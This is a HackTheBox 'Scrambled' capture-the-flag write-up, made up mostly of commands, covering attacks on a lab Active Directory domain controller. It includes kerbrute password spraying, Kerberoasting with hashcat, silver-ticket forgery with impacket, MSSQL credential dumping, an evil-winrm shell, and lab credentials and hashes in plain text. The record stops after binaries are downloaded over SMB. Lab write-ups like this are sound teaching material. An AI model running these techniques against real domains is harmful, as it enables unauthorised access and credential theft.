![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/scrambled%20logo.png)

## nmap
### nmap all ports
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/nmap%20all%20ports.png)

### nmap services + versions 

````bash
# Nmap 7.92 scan initiated Sat Oct  8 07:29:53 2022 as: nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49697,49701,56187, -v --min-rate 1000 -oN nmap-services-versions -sCV 10.10.11.168
Nmap scan report for 10.10.11.168
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-08 11:30:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-08T11:33:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679c fca8 69ad 25c0 86d2 e8bb 1792 d7c3
|_SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 4233
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679c fca8 69ad 25c0 86d2 e8bb 1792 d7c3
|_SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 4233
|_ssl-date: 2022-10-08T11:33:09+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2022-10-08T11:33:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-10-08T10:02:49
| Not valid after:  2052-10-08T10:02:49
| MD5:   4f8f a3da 161e 2942 4ed1 c9b2 d5cb 322d
|_SHA-1: c478 9c34 9392 0b59 beca fd8f bed0 68ed 07ea 2100
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-08T11:33:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679c fca8 69ad 25c0 86d2 e8bb 1792 d7c3
|_SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 4233
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-08T11:33:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679c fca8 69ad 25c0 86d2 e8bb 1792 d7c3
|_SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 4233
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
56187/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.92%I=7%D=10/8%Time=63415F38%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-10-08T11:32:33
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  8 07:33:11 2022 -- 1 IP address (1 host up) scanned in 198.12 seconds


`````

### nmap scan --> new domain name --> add to /etc/hosts
- DC1.scrm.local
- scrm.local

## domain reveals potential users
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/domain.png)

### potential users
````
support
ksimpson
vbscrub
`````

### exiftool on cmd picture reveals potential username
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/exiftool.png)

### username = password
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/password%20reset%20hint%201.png)

## kerbrute userenum
```
./kerbrute userenum -d scrm.local --dc DC1.scrm.local users.txt

```

### result --> ksimpson valid user
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/kerbrute%20userenum.png)

## kerbrute passwordspray
````
./kerbrute passwordspray -d scrm.local --dc DC1.scrm.local users.txt ksimpson

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/password%20reset%20hint.png)

## impacket get TGT
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Kerberos/screenshots/kerberos%20authentication%20overview.png)

### impacket get TGT
````
sudo python3 getTGT.py scrm.local/ksimpson:ksimpson

`````

### TGT ticket name = ksimpson.ccache
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/impacket%20get%20TGT.png)

### export ticket name
````
export KRB5CCNAME=ksimpson.ccache

`````

### impacket get users SPN
````bash
sudo python3 GetUserSPNs.py -dc-host DC1.scrm.local -no-pass  scrm.local/ksimpson:ksimpson -request -k -outfile ~/Desktop/HackTheBox/Scrambled/usersSPNhash

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/impacket%20get%20users%20SPN.png)
### hashcat on SPNs hash 
````
./hashcat.bin ~/Desktop/HackTheBox/Scrambled/usersSPNhash /opt/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/hashcat%20cracked%20SPN.png)
Creds so far
````

ksimpson:ksimpson
sqlsvc:Pegasus60:b999a16500b87d17ec7f2e2a68778f05 
SPN:MSSQLSvc/dc1.scrm.local
domainSID:S-1-5-21-2743207045-1827831105-2542523200

`````

### microsoft sql server on port 1433
````
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 

`````

### trying login to mssql server
````
sudo python3 mssqlclient.py DC1.scrm.local -k

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/microsoft%20sql%20server%20login%20attempt.png)

### generate NTLM hash of password:Pegasus60
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/generate%20ntlm%20hash.png)

### two lowercase cyberchef
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/ntlm%20lowercase.png)

### getting the domain SID
````
python3 getPac.py -targetUser ksimpson scrm.local/ksimpson:ksimpson

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/domain%20SID.png)

````
domain SID: S-1-5-21-2743207045-1827831105-2542523200

`````

### creating silver ticket impacket
````bash
sudo python3 ticketer.py -domain scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -user-id 500 Administrator -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200

export KRB5CCNAME=Administrator.ccache

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/silver%20ticket%20impacket.png)

### login mssqlclient impacket with new ticket
````
sudo python3 mssqlclient.py DC1.scrm.local -k

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/mssqlclient%20login%20database%20silver%20ticket.png)

### enumerate mssql database
````
select name from sys.databases;

`````
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/mssql%20list%20databeses.png)

### mssql list tables
````
select TABLE_NAME from ScrambleHR.INFORMATION_SCHEMA.TABLES;

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/mssql%20list%20table.png)

### mssql dump table UserImport
````
select * from ScrambleHR..UserImport;
select * from ScrambleHR.dbo.UserImport;

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/mssql%20dump%20table.png)

 creds
````
MiscSvc:ScrambledEggs9900                                    

`````

### impacket get TGT form user MiscSvc
````bash
sudo python3 getTGT.py scrm.local/MiscSvc:ScrambledEggs9900

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/impacket%20get%20TGT%20MiscSvc.png)

### export ticket
````bash
export KRB5CCNAME=MiscSvc.ccache

`````

/etc/krb5.conf
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/krb5.conf.png)

### evil-winrm
````
evil-winrm -r SCRM.LOCAL -i dc1.scrm.local

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/evil-winrm%20shell.png)

### user.txt
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/user.txt.png)

### download utility not working
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/powershell%20download%20file.png)

### download .exe and .dll
### impacket smbclient
````bash
python3 smbclient.py -k scrm.local/MiscSvc:ScrambledEggs9900@dc1.scrm.local -dc-ip dc1.scrm.local

`````

````
```
use IT
get Apps/Sales Order Client/ScrambleClient.exe
get Apps/Sales Order Client/ScrambleLib.dll
```

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/impacket%20smbclient%20download%20file.png)

XXXXXXXXX